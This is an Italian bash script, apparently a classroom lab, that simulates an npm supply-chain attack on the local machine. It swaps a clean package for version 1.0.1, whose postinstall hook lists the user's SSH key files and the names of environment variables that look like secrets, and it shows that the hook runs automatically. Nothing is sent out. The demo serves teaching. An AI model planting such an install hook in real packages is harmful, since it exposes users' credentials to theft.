#!/bin/bash
# resurrection-lab.sh
# Simula un supply chain attack senza dipendenze esterne
# Uso: ./resurrection-lab.sh

set -e

LAB_DIR="/tmp/lab-supply-chain"
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m'

echo ""
echo -e "${RED}=== RESURRECTION LAB ===${NC}"
echo "Simulazione supply chain attack"
echo ""

# Cleanup
rm -rf "$LAB_DIR"
mkdir -p "$LAB_DIR"

# === FASE 1: il pacchetto pulito ===
echo -e "${GREEN}[1/5]${NC} Creo il pacchetto pulito: zzz-pirate-utils@1.0.0"
mkdir -p "$LAB_DIR/zzz-pirate-utils"
cat > "$LAB_DIR/zzz-pirate-utils/package.json" <<EOF
{
  "name": "zzz-pirate-utils",
  "version": "1.0.0",
  "main": "index.js"
}
EOF
echo 'module.exports.greet = () => "Ciao dal pacchetto pulito!";' > "$LAB_DIR/zzz-pirate-utils/index.js"

# === FASE 2: la vittima installa il pacchetto pulito ===
echo -e "${GREEN}[2/5]${NC} Creo il progetto vittima e installo la versione pulita"
mkdir -p "$LAB_DIR/victim-app"
cd "$LAB_DIR/victim-app"
npm init -y --silent > /dev/null 2>&1
npm install "$LAB_DIR/zzz-pirate-utils" --save 2>&1 | tail -2

echo ""
echo "  Contenuto di node_modules/zzz-pirate-utils/index.js:"
echo -e "  ${GREEN}$(cat node_modules/zzz-pirate-utils/index.js)${NC}"

# === FASE 3: verifica che funziona ===
echo ""
echo -e "${GREEN}[3/5]${NC} La vittima usa il pacchetto:"
node -e "const u = require('zzz-pirate-utils'); console.log('  > ' + u.greet());"
echo ""

# === FASE 4: avvelena il pacchetto ===
echo -e "${RED}[4/5]${NC} Il maintainer cambia. Qualcuno avvelena zzz-pirate-utils@1.0.1"
cd "$LAB_DIR/zzz-pirate-utils"
cat > package.json <<EOF
{
  "name": "zzz-pirate-utils",
  "version": "1.0.1",
  "main": "index.js",
  "scripts": {
    "postinstall": "node postinstall.js"
  }
}
EOF

cat > postinstall.js <<'PAYLOAD'
const os = require('os');
const fs = require('fs');
const home = os.homedir();

console.log("");
console.log("\033[31m  !!! RESURRECTED !!!\033[0m");
console.log("");
console.log("  Sono zzz-pirate-utils@1.0.1.");
console.log("  Il maintainer e' cambiato. Nessuno se ne e' accorto.");
console.log("  Ora giro con i tuoi permessi.");
console.log("");
console.log("  Utente: " + os.userInfo().username);
console.log("  Home:   " + home);
console.log("  CWD:    " + process.cwd());

// Mostro cosa potrei rubare
try {
    const sshFiles = fs.readdirSync(home + '/.ssh');
    console.log("  SSH:    " + sshFiles.filter(f => !f.startsWith('.')).join(', '));
} catch(e) {}

const envKeys = Object.keys(process.env)
    .filter(k => /token|key|secret|pass|auth|api/i.test(k));
if (envKeys.length > 0) {
    console.log("  ENV:    " + envKeys.join(', '));
}

console.log("");
console.log("  Non ho mandato niente da nessuna parte.");
console.log("  Ma avrei potuto.");
console.log("");
PAYLOAD

# Aggiorna anche index.js per sembrare innocuo
echo 'module.exports.greet = () => "Ciao dal pacchetto pulito!";' > index.js

# === FASE 5: la vittima reinstalla ===
echo ""
echo -e "${RED}[5/5]${NC} La vittima reinstalla le dipendenze..."
echo ""
cd "$LAB_DIR/victim-app"
rm -rf node_modules
npm install "$LAB_DIR/zzz-pirate-utils" 2>&1

echo ""
echo -e "${YELLOW}=== RISULTATO ===${NC}"
echo ""
echo "La vittima aveva zzz-pirate-utils@1.0.0 (pulito)."
echo "Ha reinstallato. Ha preso 1.0.1 (avvelenato)."
echo "Il postinstall si e' eseguito automaticamente."
echo "Nessun warning. Nessuna conferma."
echo ""
echo -e "${RED}Non avete sfruttato una vulnerabilita'.${NC}"
echo -e "${RED}Avete solo usato il sistema come e' stato progettato.${NC}"
echo ""
